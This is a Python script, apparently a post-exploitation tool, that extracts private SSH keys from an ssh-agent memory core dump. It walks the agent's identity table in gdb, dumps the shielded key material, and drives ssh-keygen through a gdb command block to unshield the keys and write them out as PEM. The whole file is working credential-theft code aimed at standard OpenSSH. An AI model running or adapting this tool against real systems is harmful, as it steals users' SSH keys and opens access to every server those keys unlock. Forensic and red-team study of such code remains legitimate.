#!/usr/bin/python3

# A script to automate the extraction of SSH keys from a ssh-agent process memory dump
# Supports: RSA, DSA, ED25519, ECDSA
# Author: @Kracken256
# Version: 2.0


import os
import sys
from pwn import log
from typing import List
import binascii
import subprocess


# Finds the index of the string '/tmp/ssh-' in a file

gdb_key_unshield_cmd = """break main
break sshkey_free
r
set $miak = (struct sshkey *)sshkey_new(0)
set $shielded_private = (unsigned char *)malloc(1392)
set $shield_prekey = (unsigned char *)malloc(16384)
set $fd = fopen("/tmp/key-priv-shield.raw", "r")
call fread($shielded_private, 1, 1392, $fd)
call fclose($fd)
set $fd = fopen("/tmp/key-prekey-shield.raw", "r")
call fread($shield_prekey, 1, 16384, $fd)
call fclose($fd)
set $miak->shielded_private=$shielded_private
set $miak->shield_prekey=$shield_prekey
set $miak->shielded_len=1392
set $miak->shield_prekey_len=16384
call sshkey_unshield_private($miak)
bt
f 1
x *kp
call sshkey_save_private(*kp, "/tmp/key-extracted.pem", "", "comment", 0, \"\\x00\", 0)
k
q
"""

program_version = 'v2.0'


log.info(f"SSH Key Finder {program_version}")
log.info("Author: @Kracken256")


def find_magic_marker(filepath: str) -> int:
    with open(filepath, "rb") as file:
        chunk_size = 4096
        chunk_index = 0
        chunk = file.read(chunk_size)
        while chunk:
            index = chunk.find(b'/tmp/ssh-')
            if index != -1:
                return index + chunk_index
            chunk = file.read(chunk_size)
            chunk_index += chunk_size
    return None

# Step back until the first pointer is found. Return as int.


def find_idtable(filepath: str, index: int) -> int:
    with open(filepath, "rb") as file:
        file.seek(index)
        current_index = index
        flip_flop = False
        result_str = ""
        while True:
            current_index -= 1
            file.seek(current_index)
            byte = file.read(1)
            if byte == b'\x00' and flip_flop:
                pointer = int.from_bytes(binascii.unhexlify(
                    result_str), byteorder='big', signed=False)
                return pointer
            if byte != b'\x00':
                flip_flop = True
                result_str += byte.hex()
            if index - current_index > 256:
                return None


# This is flipped wierdly. It returns the data in the format of a string of hex bytes. But is works.


def pointer_tostring(pointer: int) -> str:
    return f"0x{binascii.hexlify(pointer.to_bytes(8, byteorder='big')).decode('utf-8')}"


def gdb_run_command_parse(binary_path: str, coredump: str, pointer: int) -> bytes:
    p = subprocess.Popen(['gdb', binary_path, coredump, '-ex', 'echo StartOfExec\n', '-ex', f'x/24gx {pointer}', '-ex', 'quit', '-q'],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
    out, err = p.communicate()

    result = out.decode('utf-8')
    result = result[result.find("StartOfExec")+len("StartOfExec"):].strip()
    lines = result.split("\n")
    new_result = b''
    new_lines = []
    for line in lines:
        tmp = line[line.find(":")+1:].strip().replace(' ',
                                                      '').replace('\t', '').replace('0x', '')
        new_lines.append(tmp)
    new_result = ''.join(new_lines).replace('\n', '')
    new_result = binascii.unhexlify(new_result)
    return new_result

# Checks if a pointer is valid. Not the best way to do this.


def check_virtual_pointer(pointer: int) -> bool:
    if pointer < 0xfffffffff:
        return False
    return True

# Save our sanity by checking the first pointer


def validate_idtable_ptr(coredump: str, binary_path: str, pointer: int) -> bool:
    data = gdb_run_command_parse(binary_path, coredump, pointer)
    if len(data) < 32:
        return None
    if data[7] == 0:
        return None

    other_pointer_1 = int.from_bytes(
        data[8:16], byteorder='big', signed=False)
    other_pointer_2 = int.from_bytes(
        data[16:24], byteorder='big', signed=False)

    if not check_virtual_pointer(other_pointer_1) or not check_virtual_pointer(other_pointer_2):
        return None

    return data[7]


def find_identity(coredump: str, binary_path, pointer: int, i: int) -> int:

    # get the i'th identity pointer from list
    data = gdb_run_command_parse(binary_path, coredump, pointer)
    pointer = int.from_bytes(
        data[16:24], byteorder='big', signed=False)
    other_pointer = 0
    iteration = 0
    while iteration < i:
        data = gdb_run_command_parse(binary_path, coredump, pointer)

        pointer = int.from_bytes(
            data[8:16], byteorder='big', signed=False)
        other_pointer = int.from_bytes(
            data[16:24], byteorder='big', signed=False)
        iteration += 1
    if not check_virtual_pointer(other_pointer):
        return None
    return other_pointer


def shred_file(filepath: str):
    subprocess.run(['shred', '-uzf', filepath])


def find_sshkey(coredump: str, binary_path, pointer: int):
    data = gdb_run_command_parse(binary_path, coredump, pointer)

    if len(data) < 8:
        return None
    return pointer, data[7]


def dump_ecdsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
    raw_sshkey = None
    raw_sshkey = gdb_run_command_parse(binary_path, coredump, sshkey_ptr)

    shielded_private = int.from_bytes(
        raw_sshkey[0x90-8:0x90], byteorder='big', signed=False)

    shielded_private_size = int.from_bytes(
        raw_sshkey[0x90:0x90 + 8], byteorder='big', signed=False)

    shielded_prekey = int.from_bytes(
        raw_sshkey[0x90+8:0x90+16], byteorder='big', signed=False)

    shielded_prekey_size = int.from_bytes(
        raw_sshkey[0x90+16:0x90+24], byteorder='big', signed=False)

    # Dump the shielded private key from core
    subprocess.run(['gdb', binary_path,
                   coredump, '-ex', f'dump memory /tmp/key-priv-shield.raw {shielded_private} {shielded_private+shielded_private_size}', '-ex', f'dump memory /tmp/key-prekey-shield.raw {shielded_prekey} {shielded_prekey+shielded_prekey_size}', '-ex', 'quit', '-q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Unshield the private key
    sp = subprocess.Popen(["gdb", "./ssh-keygen", "-q"], stdin=subprocess.PIPE,
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sp.stdin.write(gdb_key_unshield_cmd.encode("utf-8"))
    out, err = sp.communicate()

    # Secure the private key
    shred_file("/tmp/key-prekey-shield.raw")
    shred_file("/tmp/key-priv-shield.raw")
    with open("/tmp/key-extracted.pem", "r") as file:
        data = file.read()
        shred_file("/tmp/key-extracted.pem")
        return data


def dump_rsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
    raw_sshkey = None
    raw_sshkey = gdb_run_command_parse(binary_path, coredump, sshkey_ptr)

    shielded_private = int.from_bytes(
        raw_sshkey[0x90-8:0x90], byteorder='big', signed=False)

    shielded_private_size = int.from_bytes(
        raw_sshkey[0x90:0x90 + 8], byteorder='big', signed=False)

    shielded_prekey = int.from_bytes(
        raw_sshkey[0x90+8:0x90+16], byteorder='big', signed=False)

    shielded_prekey_size = int.from_bytes(
        raw_sshkey[0x90+16:0x90+24], byteorder='big', signed=False)

    # Dump the shielded private key from core
    # Dump the shielded prekey from core
    subprocess.run(['gdb', binary_path,
                   coredump, '-ex', f'dump memory /tmp/key-priv-shield.raw {shielded_private} {shielded_private+shielded_private_size}', '-ex', f'dump memory /tmp/key-prekey-shield.raw {shielded_prekey} {shielded_prekey+shielded_prekey_size}', '-ex', 'quit', '-q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Unshield the private key

    sp = subprocess.Popen(["gdb", "./ssh-keygen"], stdin=subprocess.PIPE,
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sp.stdin.write(gdb_key_unshield_cmd.encode("utf-8"))
    sp.communicate()
    shred_file("/tmp/key-prekey-shield.raw")
    shred_file("/tmp/key-priv-shield.raw")
    with open("/tmp/key-extracted.pem", "r") as file:
        data = file.read()
        shred_file("/tmp/key-extracted.pem")
        return data


def dump_dsa(coredump: str, binary_path, sshkey_ptr: int) -> str:
    raw_sshkey = None
    raw_sshkey = gdb_run_command_parse(binary_path, coredump, sshkey_ptr)

    shielded_private = int.from_bytes(
        raw_sshkey[0x90-8:0x90], byteorder='big', signed=False)

    shielded_private_size = int.from_bytes(
        raw_sshkey[0x90:0x90 + 8], byteorder='big', signed=False)

    shielded_prekey = int.from_bytes(
        raw_sshkey[0x90+8:0x90+16], byteorder='big', signed=False)

    shielded_prekey_size = int.from_bytes(
        raw_sshkey[0x90+16:0x90+24], byteorder='big', signed=False)

    # Dump the shielded private key from core
    # Dump the shielded prekey from core
    subprocess.run(['gdb', binary_path,
                   coredump, '-ex', f'dump memory /tmp/key-priv-shield.raw {shielded_private} {shielded_private+shielded_private_size}', '-ex', f'dump memory /tmp/key-prekey-shield.raw {shielded_prekey} {shielded_prekey+shielded_prekey_size}', '-ex', 'quit', '-q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Unshield the private key

    sp = subprocess.Popen(["gdb", "./ssh-keygen"], stdin=subprocess.PIPE,
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sp.stdin.write(gdb_key_unshield_cmd.encode("utf-8"))
    sp.communicate()
    shred_file("/tmp/key-prekey-shield.raw")
    shred_file("/tmp/key-priv-shield.raw")
    with open("/tmp/key-extracted.pem", "r") as file:
        data = file.read()
        shred_file("/tmp/key-extracted.pem")
        return data


def extract_keys(filepath: str, ssh_agent) -> List[str]:
    keys: List[str] = []

    # Check if filepaths are valid
    if not os.path.exists(filepath):
        log.error(f"Error: File {filepath} does not exist.")
        return None
    # Fine the magic marker
    magic_marker = find_magic_marker(filepath)
    if magic_marker is None:
        log.warn("Error: Could not find magic marker.")
        return None
    log.info(f"Magic marker found at {magic_marker}")

    # Find the first pointer
    idtable_pointer = find_idtable(filepath, magic_marker)
    if idtable_pointer is None:
        log.warn("Error: Could not find idtable struct pointer.")
        return None

    # Validate the first pointer
    num_keys = validate_idtable_ptr(filepath, ssh_agent, idtable_pointer)
    if not num_keys:
        log.warn("Error: First pointer is invalid.")
        return None
    log.info(
        f"Found the idtable struct at {pointer_tostring(idtable_pointer)}")
    log.success(f"Found {num_keys} ssh private keys.")
    # Get second pointer
    for i in range(1, num_keys+1):
        key_type = 0
        try:
            second_pointer = find_identity(
                filepath, ssh_agent, idtable_pointer, i)
            if second_pointer is None:
                log.warn(
                    "Could not find identity struct pointer (The key could be encrypted.)")
                raise Exception("Could not find identity struct pointer.")

            log.info(
                f"Found identity struct {i} at {pointer_tostring(second_pointer)}")

            # Get the key struct pointer
            _, key_type = find_sshkey(
                filepath, ssh_agent, second_pointer)
            if key_type < 0 or key_type > 3:
                log.warn("Error: Key type is invalid.")
                raise Exception("Key type is invalid.")
                # Display the sshkey type
            if key_type == 0:
                log.info("RSA key found")
                # Dump the key data
                rsa_ssh = dump_rsa(filepath, ssh_agent, second_pointer)
                if not rsa_ssh:
                    log.warn("Error: Could not dump RSA key.")
                    raise Exception("Could not dump RSA key.")
                log.success("RSA key extracted")
                keys.append(rsa_ssh)
            elif key_type == 1:
                log.info("DSA key found")
                # Dump the key data
                dsa_ssh = dump_dsa(filepath, ssh_agent, second_pointer)
                if not dsa_ssh:
                    log.warn("Error: Could not dump DSA key.")
                    raise Exception("Could not dump DSA key.")
                log.success("DSA key extracted")
                keys.append(dsa_ssh)
            elif key_type == 3:
                log.info("ECDSA key found")
                ecdsa_ssh = dump_ecdsa(filepath, ssh_agent, second_pointer)
                if not ecdsa_ssh:
                    log.warn("Error: Could not dump EXDSA key.")
                    raise Exception("Could not dump ECDSA key.")
                log.success("ECDSA key extracted")
                keys.append(ecdsa_ssh)
        except:
            log.warn(f"Error: Could not extract key of type {key_type}.")
            continue
    return keys


def main():
    # Get filepaths (coredumps) from command line arguments
    if (len(sys.argv) < 2):
        print(
            f"Usage: python3 {sys.argv[0]} <coredump>")
        sys.exit(1)
    filepaths = sys.argv[1]
    ssh_agent = '/usr/bin/ssh-agent'  # default ssh-agent path
    keys = extract_keys(filepaths, ssh_agent)
    if keys is None:
        print("Error extracting SSH keys from the memory dumps.")
        sys.exit(1)
    if len(keys) == 0:
        print("No SSH keys found in the memory dumps.")
        sys.exit(1)
    for key in keys:
        print()
        sys.stderr.write(key)
    sys.exit(0)


if __name__ == "__main__":
    main()
